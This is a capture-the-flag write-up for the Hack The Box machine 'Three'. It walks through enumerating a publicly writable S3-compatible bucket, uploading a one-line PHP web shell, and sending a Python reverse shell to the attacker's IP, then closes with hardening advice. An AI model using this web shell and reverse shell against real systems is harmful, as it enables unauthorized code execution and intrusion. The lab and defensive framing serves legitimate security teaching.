---
title: "HTB: Three - Unauthenticated S3 Bucket Web Shell"
description: "A textbook example of why you don't leave your S3 buckets publicly writable. Easy RCE via subdomains."
date: 2026-07-22
tags: ["htb", "s3", "cloud", "web-shell", "linux"]
authors: ["0xakr4m"]
image: ../images/headers/vagabond-04.png
draft: false
---

> "The truth is not what you want it to be; it is what it is." — Miyamoto Musashi, *Vagabond*

## 1. Quick Info Card
	
- **Machine Name**: Three
- **OS / Type**: Linux
- **Difficulty**: Very Easy
- **Key Vulnerability**: S3 Bucket Misconfiguration → Unauthenticated File Upload → Web Shell → Remote Code Execution

## 2. The Game Plan & The Rabbit Holes (Red Teamer Mindset)

Alright, let's set the scene. We fire up the HTB VPN, add the target IP to our `/etc/hosts` because we're not savages, and run Nmap.

**The Plan (in our heads):**
> "Okay, Nmap's running. Probably some web server, maybe SSH, let's see what we're working with. Easy money."

**What we actually got:**
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache httpd 2.4.29
```

**The Immediate Thoughts:**
- **Port 22 → SSH**. Cool, but we don't have creds.
- **Port 80 → Web server**. Let's poke it.

**Facepalm Moment #1:** We browse to `http://10.129.227.248` and it's a static band page. Nothing interesting. No hidden directories in gobuster besides `/images/`. No `robots.txt`. No `phpinfo.php`. We're sitting there like:
> "Is this it? Did I break the VPN? Is my Kali cursed? I literally just woke up for this."

**The Aha Moment:** We notice the contact section has an email: `mail@thetoppers.htb`. This hints at a subdomain. We add it to `/etc/hosts` and check it. Same content. But then we remember the lab hint: `s3.*`.

**Facepalm Moment #2:** We try `s3.thetoppers.htb` and get `{"status": "running"}`. That's different. This is an S3-compatible service. And it's public. And we can list buckets. And upload files. And execute code.

**The Thought:** "Wait, is it really that easy? No cap? No way."

Yes way. It was that easy.

---

## 3. The Execution (Step-by-Step Walkthrough)

### Recon

**Nmap Scan:**
```bash
nmap -T4 -n -Pn --top-ports 1000 -sC -sV 10.129.227.248
```

**Results:**
```text
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache httpd 2.4.29
```

**What we learned:**
- Linux box (Ubuntu)
- Apache 2.4.29
- SSH on port 22

### Web Enumeration

We visit `http://10.129.227.248/`. It's a band page called "The Toppers". We check the contact section and find an email:
```text
Email: mail@thetoppers.htb
```

We add the domain to `/etc/hosts`:
```bash
echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
```

We check the subdomain hint `s3.*` and try `s3.thetoppers.htb`:
```bash
curl -H "Host: s3.thetoppers.htb" http://10.129.227.248/
```

**Response:**
```json
{"status": "running"}
```

This is an S3-compatible service running on a custom endpoint.

### S3 Bucket Enumeration

We list the buckets using the AWS CLI (or curl if you're lazy like me):
```bash
aws configure
# Dummy credentials: test / test
aws configure set s3.endpoint_url http://s3.thetoppers.htb
aws s3 ls
```

Or the manual way:
```bash
curl -H "Host: s3.thetoppers.htb" http://10.129.227.248/?list-type=2
```

**Output:**
```xml
<ListAllMyBucketsResult>
  <Buckets>
    <Bucket>
      <Name>thetoppers.htb</Name>
    </Bucket>
  </Buckets>
</ListAllMyBucketsResult>
```

We found the bucket `thetoppers.htb`. Now we list its contents:
```bash
aws s3 ls s3://thetoppers.htb
```

Or manually:
```bash
curl -H "Host: s3.thetoppers.htb" http://10.129.227.248/thetoppers.htb/?list-type=2
```

**Output shows:**
- `.htaccess`
- `index.php`
- `/images/` with all the band photos

Wait... `index.php`? That's the website. So the bucket is serving the web root. And it's publicly writable. GG WP.

### Weaponization (Web Shell Upload)

We create a simple PHP web shell:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Upload it to the bucket:
```bash
aws s3 cp shell.php s3://thetoppers.htb/shell.php
```

Or with curl:
```bash
curl -X PUT -H "Host: s3.thetoppers.htb" http://10.129.227.248/thetoppers.htb/shell.php --data-binary @shell.php
```

Now we can execute commands:
```bash
curl http://thetoppers.htb/shell.php?cmd=id
```

**Output:**
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have code execution as `www-data`. Time to get paid.

### Reverse Shell

We set up a listener on our attacker machine:
```bash
nc -lvnp 4444
```

Then we send a reverse shell command. We can use Python:
```bash
curl -G --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.17.106\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" http://thetoppers.htb/shell.php
```

**Result:** We get a shell on our listener. We are officially in the mainframe.

### Grabbing the Flag

Now that we have a shell, we look for the flag. The lab says it's in `/var/www/`.
```bash
find / -name "*flag*" -type f 2>/dev/null
```

**Output:**
```text
/var/www/flag.txt
```

Read it:
```bash
cat /var/www/flag.txt
```

**Flag:** `HTB{...}`

---

## 4. How to Patch This (The Blue Team Defense)

So you're a sysadmin and you just watched some script kiddie upload a web shell to your server because you left your S3 bucket publicly writable. *Bruh.* Here's how to stop this from happening and save your job.

1. **Secure S3 Bucket Permissions**
   - *Root Cause:* The bucket `thetoppers.htb` allowed unauthenticated uploads (public write).
   - *Fix:* Bucket policies should be restrictive. Use the principle of least privilege.
   - *Better:* Use AWS IAM roles and policies to grant access only to specific users or services.

2. **Disable Public Listing**
   - *Root Cause:* The bucket allowed public listing (`ListBucket` permission).
   - *Fix:* Disable public listing. Only authenticated users should be able to list bucket contents.

3. **Validate File Uploads**
   - *Root Cause:* The web app didn't validate file extensions or content. A `.php` file was uploaded and executed.
   - *Fix:* Whitelist allowed file types (`.jpg`, `.png`, `.gif`). Rename uploaded files with random names and store them outside the web root.

4. **Use a Proper Web Server Configuration**
   - *Root Cause:* The web server (`/var/www/html`) served the S3 bucket contents directly.
   - *Fix:* Store uploaded files in a separate directory and serve them through a proxy or middleware that handles access control.

5. **Enable Access Logging**
   - *Root Cause:* The attack would have been caught earlier with proper logging.
   - *Fix:* Enable S3 access logging to monitor for unauthorized access or unusual upload patterns.

6. **Disable PHP Execution in Upload Directories**
   - *Root Cause:* The upload directory allowed execution of PHP files.
   - *Fix:* Add `.htaccess` rules to prevent execution:

```apache
<Directory /var/www/html/uploads>
    php_flag engine off
</Directory>
```

---

## Final Thoughts

This machine is a textbook example of how cloud misconfigurations can lead to a full compromise. A simple publicly writable S3 bucket + a web server serving from that bucket = instant code execution. 

As Musashi said:
> "There is nothing outside of yourself that can ever enable you to get better, stronger, richer, quicker, or smarter. Everything is within. Everything exists. Seek nothing outside of yourself."

Except maybe better S3 security practices. Seek those out, please.

GG. See you on the next box.

*Write-up by 0xAkram | HTB Player #106084*
